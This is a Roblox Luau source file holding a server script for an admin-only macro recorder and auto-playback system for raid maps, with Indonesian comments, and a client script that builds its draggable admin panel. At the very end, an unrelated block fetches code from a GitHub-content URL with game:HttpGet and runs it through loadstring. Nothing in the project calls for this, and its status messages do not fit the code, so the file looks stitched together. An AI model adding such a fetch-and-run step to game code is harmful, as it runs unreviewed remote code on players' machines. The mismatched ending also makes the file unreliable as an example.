--!strict
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Recorder = require(script.Parent.MacroRecorder)
local Store = require(script.Parent.MacroStore)
local MacroPlayer = require(script.Parent.MacroPlayer)
local Adapter = require(script.Parent.GameAdapter)

-- UserId yang boleh mengontrol sistem ini
local ADMIN_IDS: { [number]: boolean } = {
	-- [12345678] = true,
}

local VALID_MAPS = { Raid1 = true, Raid2 = true, Raid3 = true, Raid4 = true }
local READY_MODE = "AfterAllPlaced" -- atau "AfterAll"

local control = Instance.new("RemoteEvent")
control.Name = "MacroControl"
control.Parent = ReplicatedStorage

local statusRemote = Instance.new("RemoteEvent")
statusRemote.Name = "MacroStatus"
statusRemote.Parent = ReplicatedStorage

local autoPlay: { [Player]: boolean } = {}
local running: { [Player]: any } = {}
local recordingMap: { [Player]: string } = {}

local function push(player: Player, message: string?)
	local saved = {}
	for key in pairs(VALID_MAPS) do
		saved[key] = Store.Get(player, key) ~= nil
	end
	statusRemote:FireClient(player, {
		recording = recordingMap[player],
		autoPlay = autoPlay[player] == true,
		saved = saved,
		message = message,
	})
end

local function startPlayback(player: Player, mapKey: string)
	if running[player] then running[player]:Cancel() end
	local macro = Store.Get(player, mapKey)
	if not macro then
		push(player, mapKey .. " belum punya rekaman")
		return
	end
	running[player] = MacroPlayer.Play(player, macro, Adapter, READY_MODE)
	push(player, "Map terdeteksi: " .. mapKey .. " (memutar rekaman)")
end

Adapter.MapChanged.Event:Connect(function(mapKey: string)
	if not VALID_MAPS[mapKey] then return end
	for player, enabled in pairs(autoPlay) do
		if enabled and not Recorder.IsRecording(player) then
			startPlayback(player, mapKey)
		end
	end
end)

control.OnServerEvent:Connect(function(player: Player, command: any, arg: any)
	if not ADMIN_IDS[player.UserId] then return end
	if type(command) ~= "string" then return end

	if command == "RequestStatus" then
		push(player, "Siap")
	elseif command == "StartRecord" and type(arg) == "string" and VALID_MAPS[arg] then
		if running[player] then running[player]:Cancel() end
		Recorder.Start(player, arg)
		recordingMap[player] = arg
		push(player, "Merekam " .. arg .. "...")
	elseif command == "StopRecord" then
		local mapKey = recordingMap[player]
		recordingMap[player] = nil
		local macro = Recorder.Stop(player)
		if macro then
			Store.Set(player, macro.mapKey, macro)
			push(player, string.format("%s tersimpan (%d aksi)", macro.mapKey, #macro.actions))
		else
			push(player, (mapKey or "Rekaman") .. " kosong, tidak disimpan")
		end
	elseif command == "SetAutoPlay" then
		autoPlay[player] = (arg == true)
		push(player, autoPlay[player] and "Auto Play aktif" or "Auto Play nonaktif")
	elseif command == "StopPlayback" then
		if running[player] then running[player]:Cancel() end
		push(player, "Playback dihentikan")
	end
end)

Players.PlayerRemoving:Connect(function(player)
	if running[player] then running[player]:Cancel() end
	running[player], autoPlay[player], recordingMap[player] = nil, nil, nil
	Recorder.Cleanup(player)
	Store.Release(player)
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local control = ReplicatedStorage:WaitForChild("MacroControl")
local statusRemote = ReplicatedStorage:WaitForChild("MacroStatus")

local MAPS = { "Raid1", "Raid2", "Raid3", "Raid4" }
local selectedMap = "Raid1"
local state = { recording = nil, autoPlay = false, saved = {}, message = "Siap" }

local COLOR_OFF = Color3.fromRGB(100, 40, 40)
local COLOR_ON = Color3.fromRGB(40, 160, 40)
local COLOR_NEUTRAL = Color3.fromRGB(60, 60, 60)
local COLOR_SELECTED = Color3.fromRGB(50, 100, 200)

local gui, refresh

local function make(class, props, parent)
	local obj = Instance.new(class)
	for k, v in pairs(props) do obj[k] = v end
	obj.Parent = parent
	return obj
end

local function corner(parent, radius)
	make("UICorner", { CornerRadius = UDim.new(0, radius or 6) }, parent)
end

local function button(text, pos, size, color, parent)
	local b = make("TextButton", {
		Text = text, Position = pos, Size = size, BackgroundColor3 = color,
		TextColor3 = Color3.new(1, 1, 1), Font = Enum.Font.SourceSansBold, TextSize = 14,
		AutoButtonColor = true,
	}, parent)
	corner(b, 5)
	return b
end

local function buildUI()
	gui = make("ScreenGui", { Name = "MacroUI", ResetOnSpawn = false }, player:WaitForChild("PlayerGui"))

	local main = make("Frame", {
		Size = UDim2.new(0, 260, 0, 300), Position = UDim2.new(0.02, 0, 0.2, 0),
		BackgroundColor3 = Color3.fromRGB(30, 30, 30), BorderSizePixel = 0, ClipsDescendants = true,
	}, gui)
	corner(main, 8)

	-- Title bar (drag area)
	local bar = make("Frame", {
		Size = UDim2.new(1, 0, 0, 30), BackgroundColor3 = Color3.fromRGB(20, 20, 20), BorderSizePixel = 0,
	}, main)
	corner(bar, 8)
	make("TextLabel", {
		Size = UDim2.new(1, -40, 1, 0), Position = UDim2.new(0, 10, 0, 0), BackgroundTransparency = 1,
		Text = "Tower Macro (Admin)", TextColor3 = Color3.new(1, 1, 1),
		Font = Enum.Font.SourceSansBold, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left,
	}, bar)
	local minBtn = button("-", UDim2.new(1, -28, 0, 3), UDim2.new(0, 24, 0, 24), COLOR_NEUTRAL, bar)

	local content = make("Frame", {
		Size = UDim2.new(1, 0, 1, -30), Position = UDim2.new(0, 0, 0, 30), BackgroundTransparency = 1,
	}, main)

	-- Map selector
	make("TextLabel", {
		Size = UDim2.new(0.9, 0, 0, 18), Position = UDim2.new(0.05, 0, 0, 6), BackgroundTransparency = 1,
		Text = "Pilih map rekaman (✔ = sudah ada)", TextColor3 = Color3.fromRGB(200, 200, 200),
		Font = Enum.Font.SourceSans, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
	}, content)

	local mapButtons = {}
	for i, name in ipairs(MAPS) do
		local b = button(name, UDim2.new(0.05 + (i - 1) * 0.225, 0, 0, 28), UDim2.new(0.21, 0, 0, 30), COLOR_NEUTRAL, content)
		b.TextSize = 12
		mapButtons[name] = b
		b.MouseButton1Click:Connect(function()
			if state.recording then return end -- tidak bisa ganti map saat merekam
			selectedMap = name
			refresh()
		end)
	end

	local recordBtn = button("Record", UDim2.new(0.05, 0, 0, 68), UDim2.new(0.9, 0, 0, 32), Color3.fromRGB(50, 150, 50), content)
	local autoBtn = button("Auto Play: OFF", UDim2.new(0.05, 0, 0, 106), UDim2.new(0.9, 0, 0, 32), COLOR_OFF, content)
	local stopBtn = button("Stop Playback", UDim2.new(0.05, 0, 0, 144), UDim2.new(0.9, 0, 0, 32), Color3.fromRGB(180, 40, 40), content)

	local statusLabel = make("TextLabel", {
		Size = UDim2.new(0.9, 0, 0, 80), Position = UDim2.new(0.05, 0, 0, 184),
		BackgroundColor3 = Color3.fromRGB(20, 20, 20), TextColor3 = Color3.fromRGB(0, 255, 150),
		Font = Enum.Font.SourceSans, TextSize = 13, TextWrapped = true,
		TextYAlignment = Enum.TextYAlignment.Top, Text = "",
	}, content)
	corner(statusLabel, 5)

	-- Events
	recordBtn.MouseButton1Click:Connect(function()
		if state.recording then
			control:FireServer("StopRecord")
		else
			control:FireServer("StartRecord", selectedMap)
		end
	end)
	autoBtn.MouseButton1Click:Connect(function()
		control:FireServer("SetAutoPlay", not state.autoPlay)
	end)
	stopBtn.MouseButton1Click:Connect(function()
		control:FireServer("StopPlayback")
	end)

	local minimized = false
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		content.Visible = not minimized
		main.Size = minimized and UDim2.new(0, 260, 0, 30) or UDim2.new(0, 260, 0, 300)
		minBtn.Text = minimized and "+" or "-"
	end)

	-- Drag (mouse & touch)
	local dragging, dragStart, startPos
	bar.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging, dragStart, startPos = true, input.Position, main.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local d = input.Position - dragStart
			main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)

	refresh = function()
		for _, name in ipairs(MAPS) do
			local b = mapButtons[name]
			b.Text = (state.saved[name] and "✔ " or "") .. name
			b.BackgroundColor3 = (name == selectedMap) and COLOR_SELECTED or COLOR_NEUTRAL
		end
		if state.recording then
			recordBtn.Text = "Stop Record (" .. state.recording .. ")"
			recordBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		else
			recordBtn.Text = "Record " .. selectedMap
			recordBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
		end
		autoBtn.Text = state.autoPlay and "Auto Play: ON" or "Auto Play: OFF"
		autoBtn.BackgroundColor3 = state.autoPlay and COLOR_ON or COLOR_OFF
		statusLabel.Text = "Status: " .. tostring(state.message or "Siap")
	end
	refresh()
end

-- UI hanya dibuat jika server membalas (artinya akun ini admin)
statusRemote.OnClientEvent:Connect(function(data)
	state = data
	if not gui then buildUI() end
	if state.recording then selectedMap = state.recording end
	refresh()
end)

control:FireServer("RequestStatus")

local success, err = pcall(function()
    loadstring(game:HttpGet("https://githubusercontent.com"))()
end)

if not success then
    warn("Script Error Terdeteksi: " .. tostring(err))
else
    print("Script berhasil dipicu, tetapi UI gagal muncul.")
end
